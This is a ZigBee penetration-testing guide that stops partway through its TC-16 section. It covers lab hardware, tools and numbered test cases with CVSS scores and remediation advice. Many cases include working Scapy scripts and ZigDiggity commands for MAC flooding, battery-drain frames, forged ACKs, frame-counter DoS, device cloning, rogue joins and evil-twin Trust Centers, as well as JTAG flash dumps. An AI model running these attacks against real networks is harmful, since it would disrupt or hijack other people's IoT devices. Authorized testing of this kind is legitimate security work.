# ZigBee Penetration Testing — Complete Test Case Suite

> **Scope & Legal Notice**  
> All tests described here must be performed **only on networks and devices you own or have explicit written authorization to test**. Unauthorized testing of ZigBee networks may violate the Computer Fraud and Abuse Act (CFAA), the EU NIS2 Directive, India's IT Act 2000, and equivalent national cybersecurity laws. Always obtain a signed Rules of Engagement (RoE) document before testing.

---

## Table of Contents

1. [Lab Setup & Prerequisites](#1-lab-setup--prerequisites)
2. [Hardware Tools](#2-hardware-tools)
3. [Software Tools](#3-software-tools)
4. [Test Case Types Overview](#4-test-case-types-overview)
5. [TC-01 — Passive Traffic Sniffing](#tc-01--passive-traffic-sniffing)
6. [TC-02 — Default Link Key Exploitation](#tc-02--default-link-key-exploitation)
7. [TC-03 — Over-The-Air Key Transport Capture](#tc-03--over-the-air-key-transport-capture)
8. [TC-04 — Network Key Extraction via Firmware Reverse Engineering](#tc-04--network-key-extraction-via-firmware-reverse-engineering)
9. [TC-05 — Insecure Key Storage Check](#tc-05--insecure-key-storage-check)
10. [TC-06 — Radio Jamming (DoS)](#tc-06--radio-jamming-dos)
11. [TC-07 — Link Layer Jamming (MAC-layer DoS)](#tc-07--link-layer-jamming-mac-layer-dos)
12. [TC-08 — Energy Depletion via Invalid Security Headers](#tc-08--energy-depletion-via-invalid-security-headers)
13. [TC-09 — Energy Depletion via Polling Rate Flooding](#tc-09--energy-depletion-via-polling-rate-flooding)
14. [TC-10 — ACK Spoofing Attack](#tc-10--ack-spoofing-attack)
15. [TC-11 — ACK Dropping Attack](#tc-11--ack-dropping-attack)
16. [TC-12 — Replay Attack via Frame Counter Manipulation](#tc-12--replay-attack-via-frame-counter-manipulation)
17. [TC-13 — Rogue Device / Unauthorized Node Join](#tc-13--rogue-device--unauthorized-node-join)
18. [TC-14 — Link Key Re-use / Device Cloning](#tc-14--link-key-re-use--device-cloning)
19. [TC-15 — Trust Center Impersonation](#tc-15--trust-center-impersonation)
20. [TC-16 — Unencrypted Link Key Sniffing on First Join](#tc-16--unencrypted-link-key-sniffing-on-first-join)
21. [TC-17 — Security Level Downgrade](#tc-17--security-level-downgrade)
22. [TC-18 — Frame Counter Reset / Rollback](#tc-18--frame-counter-counter-reset--rollback)
23. [TC-19 — Distributed Security Mode Weakness](#tc-19--distributed-security-mode-weakness)
24. [TC-20 — Physical Tamper / JTAG/UART Debug Port Extraction](#tc-20--physical-tamper--jtagUART-debug-port-extraction)
25. [CVSS Scoring Reference](#cvss-scoring-reference)
26. [Reporting Template](#reporting-template)
27. [References](#references)

---

## 1. Lab Setup & Prerequisites

### Minimum Lab Configuration

```
[Laptop - Kali Linux]
       |
    USB
       |
[HackRF One / YARD Stick One]   ←→   [Target ZigBee Coordinator]
                                              |
                                      [ZigBee Router]
                                              |
                                      [ZigBee End Device (e.g., smart bulb)]
```

### Environment Requirements

| Requirement | Detail |
|---|---|
| OS | Kali Linux 2023+ or Ubuntu 22.04 LTS |
| Python | 3.10+ |
| Wireshark | 4.x with IEEE 802.15.4 dissector |
| SDR Driver | libhackrf, gr-osmosdr |
| Scapy | `pip install scapy` |
| Killerbee | `pip install killerbee` |
| ZigDiggity | `git clone https://github.com/BastilleResearch/zigdiggity` |

### Legal Authorization Checklist

- [ ] Written authorization from asset owner obtained
- [ ] Test scope (device list, channels, time windows) documented
- [ ] Emergency contact for production rollback identified
- [ ] Network monitoring alerts suppressed (if authorized)
- [ ] Findings-only disclosure agreement signed

---

## 2. Hardware Tools

### Primary Sniffing & Injection Hardware

| Tool | Chipset | Use Case | Approximate Cost | Source |
|---|---|---|---|---|
| **RZUSBSTICK** (Atmel/Microchip) | AT86RF230 | Passive sniffing, KillerBee compatible | $30–$50 | Microchip Direct, Mouser |
| **YARD Stick One** | CC1111 | Sub-GHz + 2.4 GHz injection, jamming research | $99 | Great Scott Gadgets |
| **HackRF One** | MAX2837 | Broadband SDR, spectrum analysis, passive capture | $299–$349 | Great Scott Gadgets |
| **Ubertooth One** | CC2400 | Bluetooth + 802.15.4 research, good for promiscuous mode | $119 | Great Scott Gadgets |
| **Apimote v4** | CC2420 | ZigBee sniff + inject, KillerBee native | $150–$200 | River Loop Security |
| **CC2531 USB Dongle** | CC2531 | Low-cost sniffer (with custom firmware), Wireshark-compatible | $5–$15 | AliExpress / eBay |
| **ESP32-H2** | ESP32-H2 | ZigBee + Thread dev board, custom firmware testing | $5–$10 | Espressif / Adafruit |
| **nRF52840 Dongle** | nRF52840 | IEEE 802.15.4 sniffer with nRF Sniffer firmware | $10 | Nordic Semiconductor |

### Physical Access / Debug Hardware

| Tool | Use Case |
|---|---|
| **Bus Pirate v4** | UART/SPI/I2C/JTAG logic analysis on target firmware |
| **JLink EDU Mini** | JTAG/SWD debug port connection for key dumping |
| **Logic Analyzer (Saleae Logic 8)** | Protocol decoding on debug lines |
| **Hot air rework station** | Chip decapping / flash extraction |
| **Chip programmer (TL866II+)** | Flash reading from desoldered storage chips |

### Channel Coverage Note

ZigBee operates on **channels 11–26** in the 2.4 GHz band (IEEE 802.15.4). You need hardware that covers this range. CC2531 and Apimote cover all 16 channels. HackRF One covers all of them via SDR.

---

## 3. Software Tools

| Tool | Purpose | Install |
|---|---|---|
| **KillerBee** | ZigBee sniff, replay, key extraction framework | `pip install killerbee` |
| **ZigDiggity** | ZigBee attack framework (replay, key capture, DoS) | `git clone https://github.com/BastilleResearch/zigdiggity` |
| **Wireshark** | Packet analysis with ZigBee/802.15.4 dissector | `apt install wireshark` |
| **Scapy** | Custom packet crafting for ZigBee frames | `pip install scapy` |
| **GNU Radio** | SDR signal analysis, jamming simulation | `apt install gnuradio` |
| **Binwalk** | Firmware extraction and entropy analysis | `apt install binwalk` |
| **Ghidra** | Firmware reverse engineering for key extraction | ghidra.re |
| **OpenOCD** | JTAG/SWD interface for debug port access | `apt install openocd` |
| **zbdump** | KillerBee packet capture to PCAP | Included in KillerBee |
| **zbid** | Identify ZigBee device hardware | Included in KillerBee |

---

## 4. Test Case Types Overview

| Category | Test IDs | Risk Level |
|---|---|---|
| **Passive Reconnaissance** | TC-01 | Low |
| **Key Attacks** | TC-02, TC-03, TC-04, TC-05, TC-16 | Critical |
| **Denial of Service** | TC-06, TC-07, TC-08, TC-09 | High |
| **Authentication Bypass** | TC-13, TC-14, TC-15, TC-19 | Critical |
| **Protocol Manipulation** | TC-10, TC-11, TC-12, TC-17, TC-18 | High |
| **Physical / Hardware** | TC-20 | Critical |

---

## TC-01 — Passive Traffic Sniffing

**Type:** Passive Reconnaissance  
**CVSS v3.1 Base Score:** 5.3 (Medium) — `AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`  
**Vulnerability Reference:** ZigBee open-trust model; inter-device communication over shared 2.4 GHz spectrum

### Objective

Capture raw IEEE 802.15.4 frames from the target ZigBee network without transmitting any packets.

### Prerequisites

- CC2531 or Apimote within RF range of the target network
- KillerBee installed on test laptop
- Target channel identified (channel scan required if unknown)

### Steps

```bash
# Step 1 — Identify available ZigBee interfaces
zbid

# Step 2 — Scan all 16 ZigBee channels for active networks
zbscan -i /dev/ttyUSB0

# Step 3 — Note PAN ID and channel from scan output
# Example output: PAN ID: 0x1A2B  Channel: 15  Coordinator: 00:11:22:33:44:55:66:77

# Step 4 — Start passive capture on identified channel
zbdump -i /dev/ttyUSB0 -c 15 -w capture.pcap

# Step 5 — Open capture in Wireshark for analysis
wireshark capture.pcap

# Step 6 — In Wireshark, set ZigBee NWK decryption key if known:
# Edit > Preferences > Protocols > ZigBee > Add key (128-bit hex)
```

### Expected Results

| Outcome | Pass/Fail Criteria |
|---|---|
| Network discovered | PAN ID, coordinator address, channel visible in scan |
| Frames captured | 802.15.4 frames visible in Wireshark |
| Plaintext exposed | If security level is 0x00 (None), payload is fully readable |
| Encrypted traffic | If ENC-MIC-128 (0x07), payload encrypted but metadata still visible |

### Payload Example

```
Wireshark filter: zbee_nwk
Look for: Frame Control Field → Security = True/False
          Auxiliary Security Header → Security Level value
          Key Sequence Number
```

### Remediation

- Enforce security level `0x07` (ENC-MIC-128) on all frames
- Monitor for unauthorized sniffers via RF anomaly detection

---

## TC-02 — Default Link Key Exploitation

**Type:** Key Attack / Authentication Bypass  
**CVSS v3.1 Base Score:** 9.8 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Vulnerability Reference:** Default ZigBee global trust center link key `ZigBeeAlliance09`

### Objective

Join the target ZigBee network using the publicly known default link key `ZigBeeAlliance09` from a rogue device.

### Background

The ZigBee specification mandates a default centralized security global trust center link key with the value `ZigBeeAlliance09` (hex: `5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39`). Devices that do not override this key during production are trivially exploitable.

### Steps

```bash
# Step 1 — Verify target network is using centralized security mode
# (Identified from TC-01 capture — look for Trust Center address in Wireshark)

# Step 2 — Configure ZigDiggity with default link key
cd zigdiggity
python zigdiggity.py

# Step 3 — In ZigDiggity console, set interface and key
(zigdiggity) set interface /dev/ttyUSB0
(zigdiggity) set channel 15
(zigdiggity) set link_key 5A6967426565416C6C69616E636530 39

# Step 4 — Attempt to join the network using rogue device
(zigdiggity) join_network --pan_id 0x1A2B

# Step 5 — Monitor if coordinator sends network key encrypted with default link key
zbdump -i /dev/ttyUSB0 -c 15 -w join_attempt.pcap

# Step 6 — Decrypt network key transport frame in Wireshark
# Preferences > ZigBee > Keys > Add: 5A6967426565416C6C69616E636530 39
```

### Payload Detail

```
APS Command: Transport Key
Key Type: Network Key (0x01)
Key: [128-bit network key — encrypted with ZigBeeAlliance09]
Destination: Rogue device address

Once decrypted, attacker has full network key → can decrypt ALL network traffic
```

### Expected Results

| Outcome | Pass/Fail Criteria |
|---|---|
| Network join successful | Rogue device receives valid network key | **FAIL (Vuln)**|
| Network join rejected | Coordinator rejects join; network key not sent | **PASS (Secure)**|

### Remediation

- Replace default link key with a unique, device-specific install code–derived key
- Use install code link key (TC-02 entry in key table) per ZigBee 3.0 specification
- Reject devices using the default key in coordinator policy

---

## TC-03 — Over-The-Air Key Transport Capture

**Type:** Key Attack  
**CVSS v3.1 Base Score:** 8.1 (High) — `AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`  
**Vulnerability Reference:** Clear-text or weakly encrypted key transport during first join

### Objective

Capture the network key as it is transmitted over-the-air during the initial device join process.

### Steps

```bash
# Step 1 — Begin passive capture before triggering a join
zbdump -i /dev/ttyUSB0 -c 15 -w ota_key.pcap &

# Step 2 — Trigger a factory reset on a legitimate target device
# (Physical button press, or re-pair process — device-specific)
# This causes the device to re-join and request keys from coordinator

# Step 3 — Stop capture after join completes
# killall zbdump

# Step 4 — Open ota_key.pcap in Wireshark
# Filter: zbee_aps.cmd.id == 0x05 (APS Transport Key command)

# Step 5 — Inspect APS Transport Key frame
# If key_data field is unencrypted → Critical finding
# If key is encrypted with ZigBeeAlliance09 → use TC-02 result to decrypt

# Step 6 — Using KillerBee zbkey to attempt key extraction
zbkey -f ota_key.pcap
```

### Expected Results

| Scenario | Severity | Notes |
|---|---|---|
| Key in cleartext | Critical | Direct compromise of entire network |
| Key encrypted with default link key | High | Combine with TC-02 to decrypt |
| Key encrypted with unique install code key | Pass | Secure implementation |

### Remediation

- Always pre-configure unique link keys via install codes before deployment
- Enforce APS layer encryption on all key transport frames

---

## TC-04 — Network Key Extraction via Firmware Reverse Engineering

**Type:** Key Attack / Firmware Analysis  
**CVSS v3.1 Base Score:** 7.5 (High) — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`  
**Vulnerability Reference:** Security keys stored insecurely in firmware flash

### Objective

Extract the ZigBee network key or link key from device firmware binary using static analysis.

### Steps

```bash
# Step 1 — Obtain firmware binary (from vendor OTA update, JTAG dump, or flash read)
# Example: Use hardware from TC-20 to dump flash

# Step 2 — Run binwalk to identify firmware structure and extract filesystems
binwalk -e firmware.bin
binwalk --entropy firmware.bin -J entropy.png

# Step 3 — Search for 128-bit key patterns (16 consecutive non-zero bytes)
# ZigBee keys are 16 bytes (128-bit)
python3 - <<'EOF'
import re, sys

with open("firmware.bin", "rb") as f:
    data = f.read()

# Find all 16-byte sequences that are not all-zero and not all-FF
for i in range(len(data) - 16):
    chunk = data[i:i+16]
    if chunk != b'\x00'*16 and chunk != b'\xff'*16:
        entropy = len(set(chunk)) / 16.0
        if entropy > 0.75:  # High entropy = possible key
            print(f"Offset 0x{i:08X}: {chunk.hex()}")
EOF

# Step 4 — Load firmware in Ghidra for deeper analysis
# File > Import File > firmware.bin
# Look for string references: "ZigBeeAlliance", "network_key", "link_key", "nwk_key"
# Trace references to find key storage location

# Step 5 — Check for hardcoded key in string section
strings firmware.bin | grep -iE "zigbee|alliance|key|5a69674265"

# Step 6 — Cross-reference with known default key hex
grep -c "5A6967426565416C6C69616E636530 39" firmware_hex_dump.txt
```

### Expected Results

| Finding | Severity |
|---|---|
| Default key `ZigBeeAlliance09` present in binary | Critical |
| Unique key stored in plaintext flash | High |
| Key derived at runtime, not stored statically | Pass |
| Key in secure enclave / protected memory region | Pass |

### Remediation

- Store keys in hardware-protected secure storage (e.g., TrustZone, dedicated security element)
- Use key derivation from unique device secrets rather than hardcoded keys
- Enable flash read-back protection on microcontrollers (RDP Level 2 on STM32, etc.)

---

## TC-05 — Insecure Key Storage Check

**Type:** Key Attack / Configuration Review  
**CVSS v3.1 Base Score:** 7.5 (High)  
**Vulnerability Reference:** Keys stored in unprotected flash, EEPROM, or NVM

### Objective

Verify whether security keys are stored in read-protected memory regions on the target device.

### Steps

```bash
# Step 1 — Connect JLink or OpenOCD to JTAG/SWD port
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg

# Step 2 — Attempt memory read over JTAG (look for flash readback protection)
# In OpenOCD telnet console:
telnet localhost 4444
> halt
> flash banks
> dump_image flash_dump.bin 0x08000000 0x100000

# Step 3 — If dump succeeds → flash protection not enabled → FAIL
# If dump blocked by RDP → check for bypass techniques
# (Note: RDP bypass is hardware-specific and may require chip decapping)

# Step 4 — Check NVM / EEPROM region for stored keys
> dump_image eeprom_dump.bin 0x08080000 0x1000

# Step 5 — Analyze dumps with binwalk and manual hex review
xxd eeprom_dump.bin | grep -A2 -B2 "5a 69 67"

# Step 6 — Document exact offset and context of discovered keys
```

### Remediation

- Enable flash read-back protection at maximum available level
- Use hardware key wrapping (AES-wrapped keys stored in OTP)
- Implement anti-debug fuses on production silicon

---

## TC-06 — Radio Jamming (DoS)

**Type:** Denial of Service — Protocol  
**CVSS v3.1 Base Score:** 7.5 (High) — `AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`  
**Vulnerability Reference:** IEEE 802.15.4 lacks anti-jam mechanisms at physical layer

### Objective

Disrupt ZigBee network communication by increasing RF noise on the target channel, reducing Signal-to-Noise Ratio (SNR) below the receiver sensitivity threshold.

### Steps

```bash
# Step 1 — Identify target channel from TC-01 (e.g., channel 15 = 2425 MHz)
# ZigBee channel frequency formula: Fc = 2405 + 5*(channel - 11) MHz

# Step 2 — Using HackRF One + GNU Radio to generate noise
# Install GNU Radio companion: apt install gnuradio gqrx-sdr

# Step 3 — Create GNU Radio flowgraph:
# Source: Signal Source (noise type = Gaussian, amplitude = 0.9)
# Sink: osmocom Sink (device: hackrf=0, sample_rate: 2M, center_freq: 2425e6, gain: 40)

# Step 4 — Run flowgraph and monitor target device behavior
# Observe: packet loss, device resets, communication timeout errors

# Step 5 — Validate impact by watching Wireshark capture drop to 0 packets on channel

# Step 6 — Document duration and power level required for disruption
# Note: Stop test immediately if unintended interference occurs beyond test scope

# IMPORTANT: Transmitting on 2.4 GHz requires regulatory compliance (FCC Part 15, etc.)
# Only perform inside RF-shielded enclosure or with explicit regulatory authorization
```

### Expected Results

| Metric | Threshold |
|---|---|
| Packet loss during jamming | > 90% indicates effective DoS |
| Device recovery time after jamming stops | Should be < 30 seconds for resilient devices |
| Coordinator channel switching (frequency agility) | Present in resilient implementations |

### Remediation

- Implement frequency hopping or channel agility (ZigBee Green Power supports this)
- Deploy RF intrusion detection systems
- Increase coordinator transmit power within regulatory limits

---

## TC-07 — Link Layer Jamming (MAC-layer DoS)

**Type:** Denial of Service — Protocol  
**CVSS v3.1 Base Score:** 7.5 (High)  
**Vulnerability Reference:** IEEE 802.15.4 MAC ACK mechanism exploitable via burst injection

### Objective

Flood the target network with random ZigBee MAC frames to exhaust bandwidth and cause packet drops and Denial of Service at the MAC layer.

### Steps

```bash
# Step 1 — Create a Scapy script to generate random ZigBee MAC frames
cat > mac_flood.py << 'EOF'
from scapy.all import *
from scapy.layers.dot15d4 import Dot15d4, Dot15d4Data
import random, time

# Target PAN ID from TC-01
PAN_ID = 0x1A2B
CHANNEL = 15  # Set via hardware

def generate_random_frame():
    frame = Dot15d4(fcf_frametype=1) / Dot15d4Data(
        dest_panid=PAN_ID,
        dest_addr=0xFFFF,  # Broadcast
        src_addr=random.randint(0x0001, 0xFFFE)
    ) / Raw(load=bytes([random.randint(0,255) for _ in range(20)]))
    return frame

# Flood loop — run for 30 seconds
print("[*] Starting MAC layer flood — 30 second burst")
end_time = time.time() + 30
while time.time() < end_time:
    sendp(generate_random_frame(), iface="wpan0", verbose=False)
    
print("[*] Flood complete")
EOF

# Step 2 — Set up wpan0 interface using KillerBee or CC2531 driver
# (Requires kernel 802.15.4 socket support: apt install wpan-tools)
ip link set wpan0 up
iwpan phy phy0 set channel 0 15  # Page 0, Channel 15

# Step 3 — Run flood script
python3 mac_flood.py

# Step 4 — Simultaneously capture on a second interface to monitor impact
zbdump -i /dev/ttyUSB1 -c 15 -w mac_flood_capture.pcap

# Step 5 — Analyze capture: count legitimate vs. injected frames, measure ACK failures
```

### Remediation

- Implement MAC-layer rate limiting
- Use channel scanning / automatic channel switching
- Deploy energy detection (ED) thresholds to detect anomalous RF energy

---

## TC-08 — Energy Depletion via Invalid Security Headers

**Type:** Denial of Service — Battery Depletion  
**CVSS v3.1 Base Score:** 6.5 (Medium) — `AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`  
**Vulnerability Reference:** ZigBee devices process security header validation even for invalid frames

### Objective

Send bursts of ZigBee frames with malformed/invalid Auxiliary Security Headers to force the target end device to perform repeated cryptographic validation, accelerating battery depletion.

### Steps

```bash
cat > invalid_sec_header.py << 'EOF'
from scapy.all import *
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *
import time

TARGET_SHORT_ADDR = 0x1234  # From TC-01 discovery
PAN_ID = 0x1A2B

def craft_invalid_sec_frame():
    """
    Craft a ZigBee NWK frame with Security bit=True
    but with a deliberately corrupted Auxiliary Security Header:
    - Invalid security level (0x00 with security bit set = contradiction)
    - Corrupted MIC
    - Wrong key sequence number
    """
    dot15d4 = Dot15d4(fcf_frametype=1, fcf_security=0)
    mac = Dot15d4Data(dest_panid=PAN_ID, dest_addr=TARGET_SHORT_ADDR, src_addr=0x0001)
    
    # ZigBee NWK header with security=1 but invalid aux header
    # Manually craft bytes: frame_control (security bit set) + aux header (invalid)
    nwk_payload = bytes([
        0x08, 0x00,       # Frame control: security=1 (bit 1 of byte 1)
        0x00, 0x00,       # Destination address
        0x01, 0x00,       # Source address
        0x00,             # Radius
        0x00,             # Sequence number
        0x28,             # Security control (invalid level combo)
        0xFF, 0xFF, 0xFF, 0xFF,  # Frame counter (max value — causes counter check fail)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Extended source
        0x00,             # Key sequence number (wrong)
        0xDE, 0xAD, 0xBE, 0xEF  # Corrupted MIC
    ])
    
    return dot15d4 / mac / Raw(load=nwk_payload)

# Send 1000 invalid frames in burst
print("[*] Sending 1000 invalid security header frames")
for i in range(1000):
    sendp(craft_invalid_sec_frame(), iface="wpan0", verbose=False)
    time.sleep(0.001)  # 1ms gap = ~1000 fps burst rate

print("[*] Burst complete — monitor target device for increased power draw")
EOF

python3 invalid_sec_header.py

# Monitor target device power consumption:
# Use a USB power meter or current probe on the target device's power supply
# Expected: Elevated current draw during burst vs baseline
```

### Metrics to Record

| Metric | Normal | During Attack |
|---|---|---|
| Device current draw (mA) | Baseline | Elevated by X% |
| Frame processing rate | N/A | Frames processed / sec |
| Estimated battery life reduction | Baseline hours | Reduced hours |

### Remediation

- Implement rate limiting on security header validation
- Drop frames with contradictory security control field values before full processing
- Add a frame-rate governor at the NWK layer

---

## TC-09 — Energy Depletion via Polling Rate Flooding

**Type:** Denial of Service — Battery Depletion  
**CVSS v3.1 Base Score:** 6.5 (Medium)  
**Vulnerability Reference:** ZigBee end devices wake up on data poll; flooding exploits this sleep cycle

### Steps

```bash
cat > poll_flood.py << 'EOF'
from scapy.all import *
from scapy.layers.dot15d4 import *
import time

# End device address from TC-01 — target sleepy end device
TARGET = 0x5678
PAN_ID = 0x1A2B

# ZigBee Data Request (MAC command type 4) — forces device to stay awake and check
def data_request():
    return (Dot15d4(fcf_frametype=3, fcf_ackreq=1) /  # Command frame, ACK requested
            Dot15d4Cmd(cmd_id=4) /                      # Data Request command
            Raw())

print("[*] Flooding target with data requests beyond polling interval")
for _ in range(500):
    sendp(data_request(), iface="wpan0", verbose=False)
    time.sleep(0.005)  # 5ms = 200 requests/sec >> typical 1-sec poll interval
EOF

python3 poll_flood.py
```

### Remediation

- Configure MAC-layer whitelist; only accept data requests from known devices
- Implement minimum inter-frame spacing enforcement
- Disable data pending bit by default unless coordinator genuinely has queued data

---

## TC-10 — ACK Spoofing Attack

**Type:** Protocol Manipulation  
**CVSS v3.1 Base Score:** 6.5 (Medium) — `AV:A/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H`  
**Vulnerability Reference:** IEEE 802.15.4 ACK frames have no integrity protection

### Objective

Jam the channel so the legitimate destination does not receive a data frame, then send a forged ACK to the sender, causing the sender to believe the transmission succeeded (data loss without detection).

### Steps

```bash
# Step 1 — This attack requires SIMULTANEOUS jamming + ACK injection
# Use two hardware interfaces: one for jamming (YARD Stick One), one for injection (Apimote)

# Step 2 — Identify target communication pair (source/dest addresses from TC-01)
# SOURCE = 0x0001 (coordinator), DEST = 0x1234 (end device)

# Step 3 — Start selective jamming on the channel
# (YARD Stick One transmitting CW or noise during the ACK window)
# This blocks the legitimate ACK from reaching the sender

# Step 4 — Craft and inject forged ACK with correct sequence number
cat > ack_spoof.py << 'EOF'
from scapy.all import *
from scapy.layers.dot15d4 import Dot15d4

# Monitor channel to extract current sequence number
# Sequence number from observed frame header
SEQ_NO = 23  # Replace with live-captured seq number

# Craft forged ACK
ack = Dot15d4(
    fcf_frametype=2,     # ACK frame type
    fcf_ackreq=0,
    fcf_pending=0,
    seqnum=SEQ_NO        # Must match the sequence number of the data frame
)

sendp(ack, iface="wpan0", verbose=True)
print(f"[*] Forged ACK sent for sequence number {SEQ_NO}")
EOF

python3 ack_spoof.py
```

### Remediation

- ZigBee 3.0 enhanced ACK (Enh-Ack) adds security headers — ensure it is enabled
- Implement application-layer acknowledgment with sequence tracking
- Use end-to-end encryption and application-layer message confirmation

---

## TC-11 — ACK Dropping Attack

**Type:** Protocol Manipulation / DoS  
**CVSS v3.1 Base Score:** 6.5 (Medium)  
**Vulnerability Reference:** ACK frames lack integrity protection; jamming ACK path forces retransmit storm

### Steps

```bash
# Selective ACK jamming using YARD Stick One
# Configure to transmit only during the 12-symbol ACK window (192 microseconds)
# This requires precise timing synchronization with observed frame pattern

# Monitor and time ACK transmissions
cat > ack_drop_monitor.py << 'EOF'
from scapy.all import *
from scapy.layers.dot15d4 import Dot15d4
import time

ack_times = []

def pkt_callback(pkt):
    if pkt.haslayer(Dot15d4):
        if pkt[Dot15d4].fcf_frametype == 2:  # ACK
            ack_times.append(time.time())
            print(f"[ACK] seq={pkt[Dot15d4].seqnum} at {ack_times[-1]:.6f}")

sniff(iface="wpan0", prn=pkt_callback, count=50, timeout=30)

# Analyze timing pattern to predict next ACK window
if len(ack_times) > 2:
    intervals = [ack_times[i+1]-ack_times[i] for i in range(len(ack_times)-1)]
    print(f"[*] Average ACK interval: {sum(intervals)/len(intervals)*1000:.2f} ms")
EOF

python3 ack_drop_monitor.py
# Use output timing data to configure selective jammer
```

---

## TC-12 — Replay Attack via Frame Counter Manipulation

**Type:** Protocol Manipulation  
**CVSS v3.1 Base Score:** 7.4 (High) — `AV:A/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H`  
**Vulnerability Reference:** Replay protection mechanism can be abused with large counter values

### Objective

Send frames with artificially high frame counter values to the target node, causing it to reject all subsequent legitimate frames with lower counter values (counter exhaustion / rollback DoS).

### Steps

```bash
cat > frame_counter_attack.py << 'EOF'
from scapy.all import *
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *
import struct

TARGET = 0x1234
PAN_ID = 0x1A2B

# Craft ZigBee NWK frame with maximum frame counter value
# When target receives this, it updates its counter to 0xFFFFFFFE
# All subsequent legitimate frames with lower counters will be DROPPED

MAX_COUNTER = 0xFFFFFFFE

nwk_header = bytes([
    0x08, 0x00,       # Frame control
    TARGET & 0xFF, (TARGET >> 8) & 0xFF,  # Destination
    0x01, 0x00,       # Source
    0x01,             # Radius
    0x01,             # Sequence number
])

aux_sec_header = bytes([
    0x28,             # Security control: Network key, Extended Nonce
]) + struct.pack("<I", MAX_COUNTER)  # Frame counter = MAX

frame = (Dot15d4(fcf_frametype=1) /
         Dot15d4Data(dest_panid=PAN_ID, dest_addr=TARGET, src_addr=0x0001) /
         Raw(load=nwk_header + aux_sec_header))

print(f"[*] Sending frame with counter = 0x{MAX_COUNTER:08X}")
sendp(frame, iface="wpan0", verbose=True)
print("[*] Target should now reject all frames with counter < 0xFFFFFFFE")
EOF

python3 frame_counter_attack.py
```

### Remediation

- Validate frame counter increment is reasonable (reject counter jumps > threshold, e.g., > 1000)
- Trigger network key refresh when counter approaches maximum value
- Implement counter synchronization mechanisms

---

## TC-13 — Rogue Device / Unauthorized Node Join

**Type:** Authentication Bypass  
**CVSS v3.1 Base Score:** 8.8 (High) — `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`  
**Vulnerability Reference:** Distributed security mode; no centralized device authentication

### Steps

```bash
# Step 1 — Identify if network uses Distributed Security Mode (no Trust Center)
# In Wireshark: Look for "ZigBee Network" > "Security" — no trust center address
# in beacon frame → Distributed mode likely

# Step 2 — Attempt join using ZigDiggity
python zigdiggity.py
(zigdiggity) set interface /dev/ttyUSB0
(zigdiggity) set channel 15

# Distributed mode join — any device with distributed security global link key can join
(zigdiggity) scan --channel 15
(zigdiggity) join --pan_id 0x1A2B --mode distributed

# Step 3 — If join succeeds, enumerate network topology
(zigdiggity) enum_network

# Step 4 — Attempt to send commands to actuators (e.g., toggle a smart light)
(zigdiggity) send_command --dest 0x5678 --cluster 0x0006 --cmd 0x02  # Toggle
```

### Remediation

- Use centralized security mode with a dedicated Trust Center
- Implement install-code–based joining; do not allow open join periods
- Restrict join window to minimal duration during commissioning only

---

## TC-14 — Link Key Re-use / Device Cloning

**Type:** Authentication Bypass  
**CVSS v3.1 Base Score:** 8.1 (High)  
**Vulnerability Reference:** ZigBee permits link key re-use for network rejoin; enables device cloning

### Steps

```bash
# Step 1 — Capture rejoin sequence from a legitimate device (trigger via power cycle)
zbdump -i /dev/ttyUSB0 -c 15 -w rejoin.pcap &
# Power cycle target device

# Step 2 — Extract device address and link key exchange from capture
# Wireshark: Filter zbee_aps.cmd.id == 0x06 (Request Key) and 0x05 (Transport Key)

# Step 3 — Clone the device address
# Configure attacker hardware with the captured short address and PAN ID

cat > clone_rejoin.py << 'EOF'
from scapy.all import *
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *

# Cloned device address from TC-01
CLONED_ADDR = 0x1234
PAN_ID = 0x1A2B

# Send Rejoin Request with cloned address
# ZigBee NWK Rejoin Request command (command identifier 0x06)
rejoin_req = (Dot15d4(fcf_frametype=1) /
              Dot15d4Data(dest_panid=PAN_ID, dest_addr=0x0000, src_addr=CLONED_ADDR) /
              Raw(load=bytes([0x09, 0x00, 0x00, 0x00, CLONED_ADDR & 0xFF, (CLONED_ADDR>>8) & 0xFF,
                              0x01, 0xAA, 0x06, 0xCE])))  # NWK command frame: rejoin req

sendp(rejoin_req, iface="wpan0", verbose=True)
print(f"[*] Rejoin request sent as cloned device 0x{CLONED_ADDR:04X}")
# Trust Center may respond with network key encrypted with previously-used link key
EOF

python3 clone_rejoin.py
```

### Remediation

- Implement unique link keys per device (install code derived)
- Rotate link keys after each successful rejoin
- Implement device fingerprinting and anomaly detection (two devices same address)

---

## TC-15 — Trust Center Impersonation

**Type:** Authentication Bypass / Man-in-the-Middle  
**CVSS v3.1 Base Score:** 9.0 (Critical) — `AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N`  
**Vulnerability Reference:** No mutual authentication between Trust Center and joining device

### Steps

```bash
# Step 1 — Set up rogue coordinator on same channel as target network
# Using Apimote or ESP32-H2 with custom ZigBee coordinator firmware

# Step 2 — Create a ZigBee network with same PAN ID (PAN ID collision)
# Configure rogue coordinator to respond to join requests before legitimate coordinator

# Step 3 — When a device attempts to join, intercept and respond as Trust Center
# Send crafted Transport Key command with attacker-controlled network key

# Step 4 — Devices that join the rogue network will:
# - Use attacker's network key
# - Send all traffic decryptable by attacker
# - Be isolated from the legitimate network

# ZigDiggity evil twin approach:
(zigdiggity) evil_twin --channel 15 --pan_id 0x1A2B

# Monitor for devices joining the rogue network
(zigdiggity) show_joined_devices
```

### Remediation

- Implement mutual Trust Center authentication (certificate-based per ZigBee IP)
- Use ZigBee 3.0 with install codes to authenticate Trust Center identity
- Monitor for duplicate PAN IDs on authorized channels

---

## TC-16 — Unencrypted Link Key Sniffing on First Join

**Type:** Key Attack  
**CVSS v3.1 Base Score:** 8.1 (High)  
